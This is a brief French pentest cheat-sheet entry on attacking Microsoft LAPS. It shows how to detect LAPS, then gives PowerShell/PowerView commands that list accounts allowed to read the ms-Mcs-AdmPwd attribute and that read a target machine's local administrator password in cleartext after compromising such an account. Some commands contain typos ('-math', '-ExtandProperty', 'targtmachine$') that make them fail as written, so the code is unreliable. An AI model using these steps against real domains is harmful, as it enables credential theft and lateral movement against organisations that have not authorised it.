Pour savoir si LAPS est utilisé, nous pouvons voir si nous trouvons un fichier AdmPwd.dll dans le dossier `C:\Program Files\LAPS\CSE`

#### Trouver les utilisateurs ayant le droit de lire les passwords LAPS

```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAce -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -math 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

Si on compromet un utilisateur ayant le droit de lire les LAPS, on peut lire le password en clair en utilisant :

```powershell
Get-DomainObject -Identity targtmachine$ | select -ExpandProperty ms-mcs-admpwd
---
Get-ADComputer -Identity targetmachine -Properties ms-mcs-admpwd | select -ExtandProperty ms-mcs-admpwd
```

